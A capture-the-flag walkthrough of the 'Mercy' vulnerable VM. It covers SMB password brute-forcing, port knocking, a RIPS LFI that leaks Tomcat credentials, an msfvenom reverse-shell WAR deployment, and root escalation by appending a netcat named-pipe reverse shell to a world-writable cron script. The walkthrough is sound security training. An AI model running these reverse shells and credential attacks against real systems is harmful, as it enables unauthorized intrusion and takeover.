## Background

The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques.

## Information Gathering

Letâ€™s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.20.130
...
PORT     STATE    SERVICE     REASON              VERSION

```

Whoa! Samba is up. Haven't seen that in a while. Along with it, you can also see `22/tcp` and `80/tcp` filtered by the firewall. In any case, let's focus on the Apache Tomcat first since `nmap` finds the presence of a disallowed entry `/tryharder/tryharder` in `robots.txt`.

<a class="image-popup">

</a>

Looks like `base64` to me. Let's decode it and see what it says.

<a class="image-popup">
![7afb37cc.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/7afb37cc.png)
</a>

Duh?! Nothing useful at the moment.

Now, let's switch our attention to the Tomcat installation.

<a class="image-popup">
![5e58c8b0.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/5e58c8b0.png)
</a>

From my experience, entering the manager webapp requires authentication. I'm not even going to try that, having no information of the usernames and passwords whatsoever.

Tomcat is a shit-show. Time to go over to Samba.

## Samba 4.3.11

One can list down the services available in Samba with `smbclient` like so.

<a class="image-popup">
![789d6f24.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/789d6f24.png)
</a>

What do we have here? A Samba share! Woohoo. Let's see if we can mount it without credentials.

<a class="image-popup">
![0d0cd907.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/0d0cd907.png)
</a>

Oops! I recall `hydra` is able to crack SMB passwords online. Time to give it a shot.

I'm assuming the username is `qiu`.

<a class="image-popup">
![b7918310.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/b7918310.png)
</a>

That was fast!

<a class="image-popup">
![c26b7415.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/c26b7415.png)
</a>

Not too bad, I must say.

## Open Sesame

The `.private` directory offers some important system information as follows.

<a class="image-popup">
![93160038.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/93160038.png)
</a>

Well well well. Port-knocking. Let's write a port-knocking script, using `nmap` to do the deed.

<div class="filename"><span>knock.sh</span></div>

```bash
#!/bin/bash

TARGET=$1
PORTS=$2

for ports in $(tr ',' ' ' <<<"$PORTS"); do
    echo "[*] Trying sequence $ports..."
    for p in $(echo $ports | tr ',' ' '); do
        nmap -n -v0 -Pn --max-retries 0 -p $p $TARGET
    done
done
```

__Open HTTP__

<a class="image-popup">
![4bd8b4f1.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/4bd8b4f1.png)
</a>

__Open SSH__

<a class="image-popup">
![f25408df.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/f25408df.png)
</a>

With two more open ports, let's get down to business.

<a class="image-popup">
![f573f6ed.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/f573f6ed.png)
</a>

I'm not amused&hellip; Moving on with the exploration, I find the presence of RIPS 0.53 as follows.

<a class="image-popup">
![f8012b3d.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/f8012b3d.png)
</a>

According to EDB-ID [18660](https://www.exploit-db.com/exploits/18660/), RIPS 0.53 is susceptible to multiple local file inclusion (LFI) vulnerabilities. Let's check it out.

<a class="image-popup">
![b82d6fca.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/b82d6fca.png)
</a>

It's an LFI alright.

## Tomcat Revisit

We can expose the passwords in `tomcat-users.xml` by making use of the LFI vulnerability.

<a class="image-popup">
![3f5186f0.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/3f5186f0.png)
</a>

Armed with the credentials, we can now log in to the manager webapp to deploy our evil webapp, a WAR file that allows a reverse shell callback.

<a class="image-popup">
![133aa32a.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/133aa32a.png)
</a>

We can use `msfvenom` to generate such a WAR file like so.

```
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f war -o evil.war
```

By the way, we are dealing with a 32-bit Ubuntu.

<a class="image-popup">
![37d41566.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/37d41566.png)
</a>

I've successfully deployed the webapp.

<a class="image-popup">
![2c7236f3.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/2c7236f3.png)
</a>

On one hand, set up your `nc` listener. On the other hand, look for the JSP page to access in the WAR file like so.

<a class="image-popup">
![607da0fe.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/607da0fe.png)
</a>

To access the malicious webapp, enter the following into your browser's address bar:

```
http://192.168.20.130/evil/tudvpurwgjh.jsp
```

I humbly present a low-privilege shell.

<a class="image-popup">
![74e9999e.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/74e9999e.png)
</a>

Before I forget, the proof of a low-privilege shell is at `/local.txt`.

<a class="image-popup">
![40848530.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/40848530.png)
</a>

## Privilege Escalation

I found out that I can log in to `fluffy`'s account with the password retrieved from `tomcat-users.xml`. And during enumeration, I also found out the way to escalate privilege to `root`.

There's a script at `/home/fluffy/.private/secrets/timeclock` that will run every three minutes (under `root` privilege) to write the current date to `/var/www/html/time`. The script is world-writable.

I append the following command to the script.

```
$ echo "rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc 192.168.20.128 5555 1>/tmp/p" >> timeclock
```

Set up another `nc` listener at `5555/tcp`. Three minutes later, I have `root` shell.

<a class="image-popup">
![7c7b76af.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/7c7b76af.png)
</a>

Before I forget, here's the proof that I'm `root`.
